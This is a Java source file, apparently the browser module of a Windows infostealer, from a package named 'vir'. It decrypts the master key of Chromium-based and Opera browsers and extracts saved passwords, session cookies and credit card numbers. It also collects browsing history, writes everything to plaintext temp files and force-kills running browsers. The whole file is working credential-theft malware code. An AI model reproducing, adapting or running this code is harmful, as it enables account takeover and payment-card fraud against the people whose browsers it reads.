package ru.xyz.vir.browser;

import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;

import javax.crypto.AEADBadTagException;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class Browser {

    private final Map<String, String> browsers;
    private final String[] profiles = {"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"};
    private final String tempPath = System.getProperty("java.io.tmpdir");
    private byte[] masterKey;

    private String passowrds;
    private String cookies;
    private String history;
    private String creditCards;

    public String getPassowrds() {
        return passowrds;
    }

    public String getCookies() {
        return cookies;
    }

    public String getHistory() {
        return history;
    }

    public String getCreditCards() {
        return creditCards;
    }

    public boolean killBrowser() {
        try {
            String[] browsersToKill = {"chrome.exe", "firefox.exe", "opera.exe", "msedge.exe", "brave.exe"};
            for (String browser : browsersToKill) {
                Runtime.getRuntime().exec("taskkill /F /IM " + browser);
            }
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public Browser() {
        try {
            Class.forName("org.sqlite.JDBC");
        } catch (ClassNotFoundException ignored) {
        }

        browsers = new HashMap<>();
        String appdata = System.getenv("LOCALAPPDATA");
        browsers.put("kometa", appdata + "\\Kometa\\User Data");
        browsers.put("orbitum", appdata + "\\Orbitum\\User Data");
        browsers.put("cent-browser", appdata + "\\CentBrowser\\User Data");
        browsers.put("7star", appdata + "\\7Star\\7Star\\User Data");
        browsers.put("sputnik", appdata + "\\Sputnik\\Sputnik\\User Data");
        browsers.put("vivaldi", appdata + "\\Vivaldi\\User Data");
        browsers.put("google-chrome-sxs", appdata + "\\Google\\Chrome SxS\\User Data");
        browsers.put("google-chrome", appdata + "\\Google\\Chrome\\User Data");
        browsers.put("epic-privacy-browser", appdata + "\\Epic Privacy Browser\\User Data");
        browsers.put("microsoft-edge", appdata + "\\Microsoft\\Edge\\User Data");
        browsers.put("uran", appdata + "\\uCozMedia\\Uran\\User Data");
        browsers.put("yandex", appdata + "\\Yandex\\YandexBrowser\\User Data");
        browsers.put("brave", appdata + "\\BraveSoftware\\Brave-Browser\\User Data");
        browsers.put("iridium", appdata + "\\Iridium\\User Data");
        String roaming = System.getenv("APPDATA");
        browsers.put("opera", roaming + "\\Opera Software\\Opera Stable");
        browsers.put("opera-gx", roaming + "\\Opera Software\\Opera GX Stable");

        try {
            processBrowsers();
        } catch (Exception ignored) {
        }
    }

    private void processBrowsers() {
        for (Map.Entry<String, String> entry : browsers.entrySet()) {
            String name = entry.getKey();
            String path = entry.getValue();
            File browserDir = new File(path);

            if (!browserDir.exists()) {
                continue;
            }

            try {
                masterKey = getMasterKey(path + "\\Local State");
                for (String profile : profiles) {
                    try {
                        processPasswords(name, path, profile);
                    } catch (Exception ignored) {
                        // Ignoruj błędy
                    }
                    try {
                        processCookies(name, path, profile);
                    } catch (Exception ignored) {
                        // Ignoruj błędy
                    }
                    try {
                        processHistory(name, path, profile);
                    } catch (Exception ignored) {
                        // Ignoruj błędy
                    }
                    try {
                        processCreditCards(name, path, profile);
                    } catch (Exception ignored) {
                        // Ignoruj błędy
                    }
                }
            } catch (Exception ignored) {
                // Ignoruj błędy
            }
        }
    }

    private byte[] getMasterKey(String localStatePath) throws Exception {
        String content = new String(Files.readAllBytes(Paths.get(localStatePath)), StandardCharsets.UTF_8);
        JSONObject json = new JSONObject(content);
        String encryptedKeyBase64 = json.getJSONObject("os_crypt").getString("encrypted_key");
        byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyBase64);
        byte[] masterKey = new byte[encryptedKey.length - 5];
        System.arraycopy(encryptedKey, 5, masterKey, 0, masterKey.length);
        return Crypt32Util.cryptUnprotectData(masterKey);
    }

    private String decryptPassword(byte[] encryptedPassword, byte[] masterKey) throws Exception {
        byte[] iv = new byte[12];
        System.arraycopy(encryptedPassword, 3, iv, 0, 12);
        byte[] cipherText = new byte[encryptedPassword.length - 15];
        System.arraycopy(encryptedPassword, 15, cipherText, 0, cipherText.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec spec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(masterKey, "AES"), spec);
        try {
            byte[] decryptedBytes = cipher.doFinal(cipherText);
            return new String(decryptedBytes, StandardCharsets.UTF_8);
        } catch (AEADBadTagException ignored) {
            return null;
        }
    }

    private void processPasswords(String name, String path, String profile) {
        String loginDataPath = name.equals("opera") || name.equals("opera-gx") ? path + "\\Login Data" : path + "\\" + profile + "\\Login Data";
        File loginDataFile = new File(loginDataPath);
        if (!loginDataFile.exists()) {
            return;
        }

        try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" + loginDataPath);
             Statement statement = connection.createStatement();
             ResultSet rs = statement.executeQuery("SELECT origin_url, username_value, password_value FROM logins");
             BufferedWriter writer = new BufferedWriter(new FileWriter(tempPath + "passwords.txt", true))) {

            writer.write("Website  |  Username  |  Password\n\n");
            while (rs.next()) {
                String url = rs.getString("origin_url");
                String username = rs.getString("username_value");
                byte[] passwordEncrypted = rs.getBytes("password_value");
                String password = decryptPassword(passwordEncrypted, masterKey);
                writer.write(url + "  |  " + username + "  |  " + password + "\n");
            }

            String passwordsFilePath = tempPath + "passwords.txt";
            passowrds = new String(Files.readAllBytes(Paths.get(passwordsFilePath)), StandardCharsets.UTF_8);
        } catch (Exception ignored) {
        }
    }

    private void processCookies(String name, String path, String profile) {
        String cookiesPath = name.equals("opera") || name.equals("opera-gx") ? path + "\\Network\\Cookies" : path + "\\" + profile + "\\Network\\Cookies";
        File cookiesFile = new File(cookiesPath);
        if (!cookiesFile.exists()) {
            return;
        }

        String tempCookies;
        try {
            tempCookies = createTempFile();
        } catch (IOException ignored) {
            return;
        }
        try {
            Files.copy(cookiesFile.toPath(), Paths.get(tempCookies), StandardCopyOption.REPLACE_EXISTING);

            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" + tempCookies);
                 Statement statement = connection.createStatement();
                 ResultSet rs = statement.executeQuery("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
                 BufferedWriter writer = new BufferedWriter(new FileWriter(tempPath + "cookies.txt", true))) {

                writer.write("Browser: " + name + " | Profile: " + profile + "\n\n");
                while (rs.next()) {
                    String hostKey = rs.getString("host_key");
                    String cookieName = rs.getString("name");
                    String cookiePath = rs.getString("path");
                    byte[] encryptedValue = rs.getBytes("encrypted_value");
                    long expiresUtc = rs.getLong("expires_utc");
                    String cookieValue = decryptPassword(encryptedValue, masterKey);

                    writer.write(hostKey + "\t" + (expiresUtc == 0 ? "FALSE" : "TRUE") + "\t" + cookiePath + "\t" + cookieName + "\t" + cookieValue + "\n");
                }

                String cookiesFilePath = tempPath + "cookies.txt";
                cookies = new String(Files.readAllBytes(Paths.get(cookiesFilePath)), StandardCharsets.UTF_8);
            }
        } catch (Exception ignored) {
        } finally {
            new File(tempCookies).delete();
        }
    }

    private void processHistory(String name, String path, String profile) {
        String historyPath = name.equals("opera") || name.equals("opera-gx") ? path + "\\History" : path + "\\" + profile + "\\History";
        File historyFile = new File(historyPath);
        if (!historyFile.exists()) {
            return;
        }

        try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" + historyPath + "?mode=ro");
             Statement statement = connection.createStatement();
             ResultSet rs = statement.executeQuery("SELECT url, visit_count FROM urls");
             BufferedWriter writer = new BufferedWriter(new FileWriter(tempPath + "history.txt", true))) {

            writer.write("Url  |  Visit Count\n\n");
            while (rs.next()) {
                String url = rs.getString("url");
                int visitCount = rs.getInt("visit_count");
                writer.write(url + "  |  " + visitCount + "\n");
            }

            String historyFilePath = tempPath + "history.txt";
            history = new String(Files.readAllBytes(Paths.get(historyFilePath)), StandardCharsets.UTF_8);
        } catch (Exception ignored) {
        }
    }

    private void processCreditCards(String name, String path, String profile) {
        String webDataPath = name.equals("opera") || name.equals("opera-gx") ? path + "\\Web Data" : path + "\\" + profile + "\\Web Data";
        File webDataFile = new File(webDataPath);
        if (!webDataFile.exists()) {
            return;
        }

        try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" + webDataPath);
             Statement statement = connection.createStatement();
             ResultSet rs = statement.executeQuery("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards");
             BufferedWriter writer = new BufferedWriter(new FileWriter(tempPath + "cc.txt", true))) {

            writer.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n");
            while (rs.next()) {
                String nameOnCard = rs.getString("name_on_card");
                int expMonth = rs.getInt("expiration_month");
                int expYear = rs.getInt("expiration_year");
                byte[] encryptedCardNumber = rs.getBytes("card_number_encrypted");
                String cardNumber = decryptPassword(encryptedCardNumber, masterKey);
                writer.write(nameOnCard + "  |  " + expMonth + "  |  " + expYear + "  |  " + cardNumber + "\n");
            }

            String ccFilePath = tempPath + "cc.txt";
            creditCards = new String(Files.readAllBytes(Paths.get(ccFilePath)), StandardCharsets.UTF_8);
        } catch (Exception ignored) {
        }
    }

    private String createTempFile() throws IOException {
        String tempFile = tempPath + "temp_" + new Random().nextInt(10000);
        Files.createFile(Paths.get(tempFile));
        return tempFile;
    }
}